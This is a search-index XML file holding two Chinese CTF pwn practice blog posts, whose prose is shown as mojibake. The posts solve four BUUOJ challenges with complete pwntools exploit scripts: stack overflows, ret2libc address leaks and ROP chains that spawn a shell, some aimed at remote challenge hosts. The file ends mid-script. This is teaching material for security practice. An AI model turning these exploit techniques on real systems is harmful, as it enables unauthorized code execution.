<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pwnç»ƒä¹ -Day03</title>
      <link href="/2020/03/16/ctf/pwn/day03/"/>
      <url>/2020/03/16/ctf/pwn/day03/</url>
      
        <content type="html"><![CDATA[<h1 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h1><h2 id="0x10-å‰è¨€"><a href="#0x10-å‰è¨€" class="headerlink" title="0x10 å‰è¨€"></a>0x10 å‰è¨€</h2><p>è¶Šæ¥è¶Šéš¾å•¦ï¼Œï¼Œï¼Œä¸€å¤©çœŸå°±å†™äº†ä¸¤é“é¢˜</p><p>PS:è¿™ä¸¤é“é¢˜è¿˜ç®—æœ‰ç‚¹æ„æ€ï¼Œå°±æ”¾åšå®¢ä¸Šäº†ï¼Œå‰é¢çš„æ²¡ä»€ä¹ˆæ„æ€</p><p>ä»Šå¤©å°±ä¸åŠ å…¥é—¨çš„RSAç©äº†</p><h2 id="0x20-ciscn-2019-c-1"><a href="#0x20-ciscn-2019-c-1" class="headerlink" title="0x20 ciscn_2019_c_1"></a>0x20 ciscn_2019_c_1</h2><p>é¢˜ç›®æ¥æºï¼šbuuoj.cn </p><p>è€ƒç‚¹ï¼šret2libcï¼Œè®¡ç®—åç§»é‡ï¼Œ18.04åœ¨è°ƒç”¨systemå‰éœ€è¦æ ˆå¯¹é½</p><p>éš¾åº¦ï¼šç®€å•</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</code></pre><p>64ä½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¼€å¯äº†NXï¼Œæ ˆæ•°æ®ä¸å¯æ‰§è¡Œ</p><p>ida åæ±‡ç¼–ä¸»è¦å‡½æ•°</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts("EEEEEEE                            hh      iii                ");  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");  puts("====================================================================");  puts("Welcome to this Encryption machine\n");  begin("Welcome to this Encryption machine\n");  while ( 1 )  {    while ( 1 )    {      fflush(0LL);      v4 = 0;      __isoc99_scanf("%d", &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts("I think you can do it by yourself");      begin("I think you can do it by yourself");    }    if ( v4 == 3 )    {      puts("Bye!");      return 0;    }    if ( v4 != 1 )      break;    encrypt("%d", &amp;v4);    begin("%d");  }  puts("Something Wrong!");  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int begin(){  puts("====================================================================");  puts("1.Encrypt");  puts("2.Decrypt");  puts("3.Exit");  return puts("Input your choice!");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int encrypt(){  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts("Input your Plaintext to be encrypted");  gets(s);  while ( 1 )  {    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    {      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      {        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      }      else      {        s[x] ^= 0xEu;      }    }    else    {      s[x] ^= 0xDu;    }    ++x;  }  puts("Ciphertext");  return puts(s);}</code></pre><p>ç®€å•æµ‹è¯•è¿‡ç¨‹åºä¹‹åæˆ‘ä»¬ä¼šå‘ç°ï¼Œç¨‹åºæä¾›äº†ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ol><li>Encrypt()å‡½æ•°</li><li>Decrypt()æ²¡é¸Ÿç”¨å‡½æ•°</li></ol><p>è€Œæˆ‘ä»¬å‘ç°åœ¨encrypt()å‡½æ•°ä¸­å‡ºç°äº†æˆ‘ä»¬æœ€å–œæ¬¢çš„gets()å‡½æ•°ï¼Œé‚£ä¹ˆæ¼æ´ç‚¹å°±æ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰‹ç®—ï¼ˆ0x50ï¼‰+(0x8)â€‹è®¡ç®—å‡ºæ¥åç§»é‡ä¸º88ï¼Œä¹Ÿå¯ä»¥ç”¨pedaæ¥ç®—ï¼Œé—®é¢˜éƒ½ä¸å¤§</p><p>ç®—å‡ºæ¥åç§»åæˆ‘ä»¬å°±å¯ä»¥å¹²æˆ‘ä»¬æƒ³å¹²çš„äº‹æƒ…äº†ï¼Œç”±äºç¨‹åºé‡Œæ²¡æœ‰ç»™å‡ºsystemå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å°±éœ€è¦è‡ªå·±æ¥æ³„éœ²libcæ¥è·å–shelläº†</p><p>å¦‚ä½•è·å–libcç‰ˆæœ¬å‘¢ï¼Œè¿™å¯çœŸä»¤äººå¤´å¤§ï¼Œæˆ‘ä»¬åœ¨ä»”ç»†çœ‹ä¸€ä¸‹</p><p>ç¨‹åºæ˜¯64ä½çš„ç¨‹åºï¼Œå‚æ•°ä¸æ”¾åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯æ”¾åœ¨å¯„å­˜å™¨ä¸­ï¼Œå› æ­¤æˆ‘ä»¬è¿˜è¦ä½¿ç”¨ROPgadgetæ¥æ‰¾ä¸€ä¸ªpop_rdi</p><pre class=" language-lang-txt"><code class="language-lang-txt">Gadgets information============================================================0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c80 : pop r14 ; pop r15 ; ret0x0000000000400c82 : pop r15 ; ret0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400aec : pop rbx ; pop rbp ; ret0x0000000000400c83 : pop rdi ; ret  &lt;-------pop_rdiæ‰¾åˆ°äº†0x0000000000400c81 : pop rsi ; pop r15 ; ret0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02</code></pre><p>æ ¹æ®æˆ‘åœ¨ <a href="http://cdusec.happyhacking.top/?post=127" target="_blank" rel="noopener">http://cdusec.happyhacking.top/?post=127</a> ä»‹ç»çš„çŸ¥è¯†ï¼Œï¼ˆä¸åŒçš„æ˜¯è¿™ä¸ªç¨‹åºæ˜¯64ä½çš„ï¼Œå› æ­¤payloadè¦å˜ä¸€ä¸‹ï¼‰</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1='a'*offset + pop_rdi_addr + elf.plt['puts'] + elf.got['puts']+ retaddr</code></pre><p>æ³„éœ²putså‡½æ•°çœŸå®åœ°å€æ¥ç¡®å®šlibcç‰ˆæœ¬</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")       sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh = process('./ciscn_2019_c_1')        elf = ELF('./ciscn_2019_c_1')        context.log_level = 'debug'    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    sh.sendlineafter('choice!\n', '1')    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    sh.recvuntil('@')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>æ‰§è¡Œå®Œä»¥åï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">[+] puts_leak_addr =&gt; 0x7f558db9e690</code></pre><p>æˆ‘ä»¬å°±å·²ç»æ³„éœ²å‡ºputsçš„çœŸå®åœ°å€äº†</p><blockquote><p>çŸ¥è¯†ç‚¹ï¼š</p><ol><li><p>Linuxçš„ç¨‹åºä¸­ä½¿ç”¨äº†å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªå‡½æ•°åœ¨æ²¡æœ‰æ‰§è¡Œå‰ï¼Œä½ æ˜¯ä¸çŸ¥é“å®ƒçš„çœŸå®åœ°å€æ˜¯ä»€ä¹ˆçš„</p></li><li><p>system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚</p></li><li><p>å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜</p></li></ol></blockquote><p>ç„¶åå°±æ˜¯æ­£å¸¸çš„ret2libcæ“ä½œäº†ï¼šå…³äºlibcseacherçš„ä½¿ç”¨æ–¹æ³•å°±ä¸è¿‡å¤šä»‹ç»äº†</p><p>å®Œæ•´exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")       sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh = process('./ciscn_2019_c_1')        elf = ELF('./ciscn_2019_c_1')        context.log_level = 'debug'    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0 #è·³è½¬åˆ°encrypt()    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    choose(1)    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    #è¯»åˆ°\nååœ¨è¯»å–ä¸€è¡Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿    sh.recvuntil('\n')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))    libc = LibcSearcher('puts', puts_leak)    libc_base = puts_leak - libc.dump('puts')    sys_addr = libc_base + libc.dump('system')    bin_sh_addr = libc_base + libc.dump('str_bin_sh')    payload2 = 'a' * 88 + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)    sh.sendline(payload2)    sh.interactive()if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>è¿™ä¸ªè„šæœ¬åœ¨Ubuntu16.04ä¸­å¯ä»¥å–å¾—shell,ä½†åœ¨18.04ä¸­ï¼Œç”±äºUbuntu18è¿è¡Œæœºåˆ¶ä¸å‰é¢ç‰ˆæœ¬çš„ä¸åŒï¼Œåœ¨è°ƒç”¨systemçš„æ—¶å€™éœ€è¦è¿›è¡Œæ ˆå¯¹é½</p><p>å› æ­¤Ubuntu18.04çš„payloadä¸ºï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">ret = 0x4006b9payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</code></pre><h2 id="0x30-OGeek2019-babyrop"><a href="#0x30-OGeek2019-babyrop" class="headerlink" title="0x30 [OGeek2019]babyrop"></a>0x30 [OGeek2019]babyrop</h2><p>é¢˜ç›®æ¥æºï¼šbuuoj.cn</p><p>è€ƒç‚¹ï¼šç»•è¿‡strncmpï¼Œrop,ret2libc,å˜é‡è¦†ç›–</p><p>éš¾åº¦ï¼šä¸­ç­‰</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped</code></pre><p>32ä½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>ç¨‹åºå¼€å¯äº†NXï¼ŒRELROï¼Œæ„å‘³ç€ä¸èƒ½ä¿®æ”¹GOTè¡¨äº†</p><p>ida åæ±‡ç¼–ä¸»è¦å‡½æ•°</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(){  int buf; // [esp+4h] [ebp-14h]  char v2; // [esp+Bh] [ebp-Dh]  int fd; // [esp+Ch] [ebp-Ch]  sub_80486BB();  fd = open("/dev/urandom", 0);#ç”Ÿæˆéšæœºæ•°  if ( fd &gt; 0 )    read(fd, &amp;buf, 4u);  v2 = sub_804871F(buf);#æ¯”è¾ƒéšæœºæ•°  sub_80487D0(v2);  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">ssize_t __cdecl sub_80487D0(char a1){  ssize_t result; // eax  char buf; // [esp+11h] [ebp-E7h]  if ( a1 == 127 )    result = read(0, &amp;buf, 0xC8u);  else    result = read(0, &amp;buf, a1);  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl sub_804871F(int a1){  size_t v1; // eax  char s; // [esp+Ch] [ebp-4Ch]  char buf[7]; // [esp+2Ch] [ebp-2Ch]  unsigned __int8 v5; // [esp+33h] [ebp-25h]  ssize_t v6; // [esp+4Ch] [ebp-Ch]  memset(&amp;s, 0, 0x20u);  memset(buf, 0, 0x20u);  sprintf(&amp;s, "%ld", a1);#ç”Ÿæˆçš„éšæœºæ•°è¯»å–åˆ°sä¸­  v6 = read(0, buf, 0x20u);#ç”¨æˆ·è¾“å…¥  buf[v6 - 1] = 0;  v1 = strlen(buf);  if ( strncmp(buf, &amp;s, v1) )    exit(0);  write(1, "Correct\n", 8u);  return v5;}</code></pre><p>ç¨‹åºä¸»è¦æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œåˆ†æä¸€ä¸‹ç¨‹åºæµç¨‹ï¼š</p><p>è¯»å–ä¸€ä¸ªéšæœºæ•°ï¼Œç„¶åä¸ç”¨æˆ·è¾“å…¥ä½œæ¯”è¾ƒï¼Œéœ€è¦ç»•è¿‡ã€‚<strong>strlen</strong>é‡åˆ°\x00ä¼šåœæ­¢ï¼Œå› æ­¤åªè¦å¼€å¤´ä¸º\x00ï¼Œæœ€ç»ˆæ¯”è¾ƒçš„é•¿åº¦v1å°±æ˜¯0ï¼Œä»è€Œç»•è¿‡strncmp</p><p>è¿™é‡Œreadçš„ç¬¬ä¸‰ä¸ªè¯»å–é•¿åº¦å‚æ•°å®é™…ä¸Šæ˜¯å‰ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼(v5)ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¸€æ¬¡è¾“å…¥è¦†ç›–ä¸º\xffï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºè¿›è¡Œå¸¸è§„ROPäº†ã€‚</p><p>æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.23.so")elf=ELF("./pwn")def pwn(ip,port,debug):    if debug==1:        io=process("./pwn")        context.log_level="debug"    else:        io=remote(ip,port)    payload='\x00'+'\xff'    io.sendline(payload)    io.interactive()if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>è¿è¡Œè¾“å‡ºCorrect</p><p>ç»•è¿‡äº†éšæœºæ•°åæˆ‘ä»¬è¿˜éœ€è¦å°†v5è¦†ç›–çš„å¤§ä¸€ç‚¹æ¥æ–¹ä¾¿æˆ‘ä»¬æº¢å‡ºï¼Œè€Œv5è·ç¦»buf(å³æˆ‘ä»¬çš„è¾“å…¥)çš„è·ç¦»ä¸ºï¼šï¼ˆ0x2c-0x25ï¼‰=7,å› æ­¤æ ¹æ®æˆ‘ä»¬ä»¥å‰åšé¢˜çš„ç»éªŒæ„é€ payloadè¦†ç›–v5ä¸º <code>\xff</code> </p><p>å› æ­¤æˆ‘ä»¬çš„payload1ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1='\x00'+'a'*6+'\xff'</code></pre><p>è¦†ç›–æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸çš„ä¸€ä¸ªread()æº¢å‡ºæ¼æ´äº†,ç”±äºç¨‹åºåªç»™äº†writeå‡½æ•°ï¼Œæˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²äº†</p><p>æœ€ç»ˆexp:</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.23.so")elf=ELF("./pwn")system_libc=libc.symbols['system']binsh_libc=libc.search('/bin/sh').next()write_libc=libc.symbols['write']write_plt=elf.plt['write']write_got=elf.got['write']main_addr=0x08048825def pwn(ip,port,debug):    if debug==1:        #io=process("./pwn")        io = process('./pwn',env={"LD_PRELOAD":"./libc-2.23.so"})        context.log_level="debug"    else:        io=remote(ip,port)    #0x2c-0x25=7    payload1='\x00'+'a'*6+'\xff'    io.sendline(payload1)    io.recvuntil('Correct\n')    #get read.got addr    #32ä½ç¨‹åºoffsetä¸€èˆ¬ä¸ºebp+4=0xe7+0x4    #payload='a'*offset+ write.plt+ retaddr +p32(0)+ write.got +p32(0)    #æ³„éœ²writeçš„gotåœ°å€    payload='a'*0xe7+'b'*0x4    payload+=p32(write_plt)+p32(main_addr)    #    write.plt +  retaddr    payload+=p32(1)+p32(write_got)+p32(0x8)    #      write(1,wirte_got,8u)    io.sendline(payload)    write_addr=u32(io.recv()[0:4])    log.success('write_leak_addr =&gt; {}'.format(hex(write_addr)))    libc_base=write_addr-write_libc    system_addr=libc_base+ system_libc    binsh_addr=binsh_libc+libc_base    log.success('libc_leak_addr =&gt; {}'.format(hex(libc_base)))    log.success('system_leak_addr =&gt; {}'.format(hex(system_addr)))    log.success('binsh_leak_addr =&gt; {}'.format(hex(binsh_addr)))    io.sendline(payload1)    io.recvuntil('Correct\n')    payload='a'*(0xe7+0x4) + p32(system_addr)+ 'bbbb' + p32(binsh_addr)    io.sendline(payload)    io.interactive()if __name__ == '__main__':    pwn("node3.buuoj.cn",27873,1)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnç»ƒä¹ -Day02</title>
      <link href="/2020/03/15/ctf/pwn/day02/"/>
      <url>/2020/03/15/ctf/pwn/day02/</url>
      
        <content type="html"><![CDATA[<h1 id="Day02"><a href="#Day02" class="headerlink" title="Day02"></a>Day02</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä»Šå¤©çš„è¿™ä¸¤é“é¢˜åŒæ ·å¾ˆæ°´ï¼Œå› æ­¤æˆ‘å†³å®šåŠ é“å…¥é—¨çš„RSAç©ç©ï¼Œä¸»è¦æ˜¯å †å­¦ä¸åŠ¨äº†ï¼Œæ­‡ä¸€æ­‡ :smile_cat:</p><h2 id="0x10-pwn1-sctf-2016"><a href="#0x10-pwn1-sctf-2016" class="headerlink" title="0x10 pwn1_sctf_2016"></a>0x10 pwn1_sctf_2016</h2><p>é¢˜ç›®æ¥æº buuoj.cn</p><p>é¢˜ç›®è€ƒç‚¹ï¼šç»å…¸æ ˆæº¢å‡ºç®—åç§»</p><p>é¢˜ç›®éš¾åº¦ï¼šå…¥é—¨</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped</code></pre><p>32ä½ï¼ŒåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>ç¨‹åºæ²¡æœ‰å¼€å¯æ ˆä¿æŠ¤ï¼Œå¼€å¯äº†NXï¼ˆæ ˆæ•°æ®ä¸å¯æ‰§è¡Œï¼‰</p><p>ida åæ±‡ç¼–ä¸»è¦å‡½æ•°</p><pre class=" language-lang-txt"><code class="language-lang-txt">int vuln(){  int v0; // ST08_4@1  const char *v1; // eax@1  char s; // [sp+1Ch] [bp-3Ch]@1  char v4; // [sp+3Ch] [bp-1Ch]@1  char v5; // [sp+40h] [bp-18h]@1  char v6; // [sp+47h] [bp-11h]@1  char v7; // [sp+48h] [bp-10h]@1  char v8; // [sp+4Fh] [bp-9h]@1  printf("Tell me something about yourself: ");  fgets(&amp;s, 32, edata);  std::string::operator=(&amp;input, &amp;s);  std::allocator<char>::allocator(&amp;v6);  std::string::string(&amp;v5, "you", &amp;v6);  std::allocator<char>::allocator(&amp;v8);  std::string::string(&amp;v7, "I", &amp;v8);  replace(&amp;v4, &amp;input, &amp;v7);  std::string::operator=(&amp;input, &amp;v4, v0, &amp;v5);  std::string::~string(&amp;v4);  std::string::~string(&amp;v7);  std::allocator<char>::~allocator(&amp;v8);  std::string::~string(&amp;v5);  std::allocator<char>::~allocator(&amp;v6);  v1 = std::string::c_str(&amp;input);  strcpy(&amp;s, v1);  return printf("So, %s\n", &amp;s);}</char></char></char></char></code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3){  int v4; // [sp+Ch] [bp-4Ch]@0  char v5; // [sp+10h] [bp-48h]@2  char v6; // [sp+14h] [bp-44h]@2  char v7; // [sp+1Bh] [bp-3Dh]@2  int v8; // [sp+1Ch] [bp-3Ch]@2  char v9; // [sp+20h] [bp-38h]@2  int v10; // [sp+24h] [bp-34h]@2  int v11; // [sp+28h] [bp-30h]@2  char v12; // [sp+2Fh] [bp-29h]@2  int v13; // [sp+30h] [bp-28h]@2  int v14; // [sp+34h] [bp-24h]@2  char v15; // [sp+38h] [bp-20h]@2  int v16; // [sp+3Ch] [bp-1Ch]@2  char v17; // [sp+40h] [bp-18h]@2  int v18; // [sp+44h] [bp-14h]@2  char v19; // [sp+48h] [bp-10h]@2  char v20; // [sp+4Ch] [bp-Ch]@2  while ( std::string::find(a2, a3, 0) != -1 )  {    std::allocator<char>::allocator(&amp;v7);    v8 = std::string::find(a2, a3, 0);    std::string::begin(&amp;v9);    __gnu_cxx::__normal_iterator<char *,std::string="">::operator+(&amp;v10);    std::string::begin(&amp;v11);    std::string::string&lt;__gnu_cxx::__normal_iterator<char *,std::string="">&gt;(&amp;v6, v11, v10, &amp;v7);    std::allocator<char>::~allocator(&amp;v7);    std::allocator<char>::allocator(&amp;v12);    std::string::end(&amp;v13);    v14 = std::string::length(a3);    v16 = std::string::find(a2, a3, 0);    std::string::begin(&amp;v17);    __gnu_cxx::__normal_iterator<char *,std::string="">::operator+(&amp;v15);    __gnu_cxx::__normal_iterator<char *,std::string="">::operator+(&amp;v18);    std::string::string&lt;__gnu_cxx::__normal_iterator<char *,std::string="">&gt;(&amp;v5, v18, v13, &amp;v12);    std::allocator<char>::~allocator(&amp;v12);    std::operator+<char,std::char_traits<char>,std::allocator<char>&gt;(&amp;v20);    std::operator+<char,std::char_traits<char>,std::allocator<char>&gt;(&amp;v19);    std::string::operator=(a2, &amp;v19, &amp;v5, v4);    std::string::~string(&amp;v19);    std::string::~string(&amp;v20);    std::string::~string(&amp;v5);    std::string::~string(&amp;v6);  }  std::string::string(a1, a2);  return a1;}</char></char,std::char_traits<char></char></char,std::char_traits<char></char></char></char></char></char></char></char></char></char></code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">int get_flag(){  return system("cat flag.txt");}</code></pre><p>é¢˜ç›®åˆ†æï¼š</p><ol><li>åº”è¯¥æ˜¯C++ç¨‹åºï¼Œä¸è¿‡å…³ç³»ä¸å¤§</li><li>ç¨‹åºæä¾›äº†replace() å‡½æ•°</li><li>ç¨‹åºæä¾›åé—¨ get_flag</li><li>åœ¨vuln()å‡½æ•°ä¸­è°ƒç”¨äº†replace()åŠŸèƒ½ï¼Œä¸»è¦æ˜¯æŠŠå­—ç¬¦ <code>I</code> æ›¿æ¢æˆ <code>you</code> , ä¸”ç¨‹åºæœ€åä¼šå°†æ›¿æ¢åçš„å­—ç¬¦ä¸²é‡æ–°å†™å…¥ <code>s</code> è¿™å°±é€ æˆäº†æ ˆæº¢å‡º</li></ol><p>åˆ©ç”¨æ€è·¯ï¼š</p><p>é€šè¿‡idaæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š<code>s</code> è·ç¦»<code>ebp</code>çš„è·ç¦»ä¸º <code>0x3c</code> ,ç¨‹åºä¸º32ä½ç¨‹åºï¼Œå› æ­¤éœ€è¦çš„åƒåœ¾å­—ç¬¦æ•°é‡ä¸º <code>0x3c+0x4</code></p><p>è€Œæˆ‘ä»¬æœ€å¤šè¾“å…¥32ä¸ªå­—ç¬¦ï¼Œä½†ç¨‹åºä¼šæŠŠæ‰€æœ‰çš„ <code>I</code> æ›¿æ¢æˆ <code>you</code> ,ä¹Ÿå°±æ˜¯è¯´ è¾“å…¥ä¸€ä¸ª <code>I</code> ç›¸å½“äº3ä¸ªå­—ç¬¦ï¼Œå› æ­¤</p><pre class=" language-lang-txt"><code class="language-lang-txt">offset='I'*21 + 'f'# 21*3+1=0x3c+0x4=68</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *#io=process("./pwn1_sctf_2016")io=remote("node3.buuoj.cn",27767)sys_addr=0x08048F0Dpayload=flat(["I" * 21,"1",p32(sys_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-ciscn-2019-n-1"><a href="#0x20-ciscn-2019-n-1" class="headerlink" title="0x20 ciscn_2019_n_1"></a>0x20 ciscn_2019_n_1</h2><p>é¢˜ç›®æ¥æº buuoj.cn</p><p>é¢˜ç›®è€ƒç‚¹ï¼šç»å…¸æ ˆæº¢å‡ºè¦†ç›–å±€éƒ¨å˜é‡</p><p>é¢˜ç›®éš¾åº¦ï¼šå…¥é—¨</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</code></pre><p>64ä½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¼€å¯NXï¼Œæ ˆæ•°æ®ä¸å¯æ‰§è¡Œ</p><p>ida åæ±‡ç¼–ä¸»è¦å‡½æ•°</p><pre class=" language-lang-txt"><code class="language-lang-txt">int func(){  int result; // eax@2  char v1; // [sp+0h] [bp-30h]@1  float v2; // [sp+2Ch] [bp-4h]@1  v2 = 0.0;  puts("Let's guess the number.");  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system("cat /flag");  else    result = puts("Its value should be 11.28125");  return result;}</code></pre><p>å¯ä»¥çœ‹å‡ºï¼š</p><ol><li>ç¨‹åºæä¾›äº†åé—¨</li><li>åªè¦è®©v2==11.28125å°±è¡Œäº†</li></ol><p>æ•…exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'io=process('./ciscn_2019_n_1')payload=flat(['a'*(0x30-0x4),p64(0x41348000)]) 